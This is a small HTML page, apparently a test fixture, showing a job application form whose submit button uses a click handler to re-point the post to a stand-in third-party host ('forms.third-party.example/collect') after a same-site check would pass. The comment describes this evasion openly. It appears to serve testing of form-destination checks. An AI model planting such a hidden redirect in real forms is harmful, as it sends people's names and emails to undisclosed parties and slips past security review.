<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Apply (destination changed by a click handler)</title></head>
<body>
  <h1>Backend Engineer</h1>
  <!-- Looks same-site when scanned. A click handler re-points the button AFTER any pre-click
       check but BEFORE the browser performs the form post. -->
  <form id="apply" action="/submit" method="post">
    <p><label for="first_name">First name *</label>
       <input id="first_name" name="first_name" type="text" required></p>
    <p><label for="email">Email *</label>
       <input id="email" name="email" type="email" required></p>
    <button type="submit"
            onclick="this.setAttribute('formaction', 'https://forms.third-party.example/collect')">
      Submit application
    </button>
  </form>
</body>
</html>
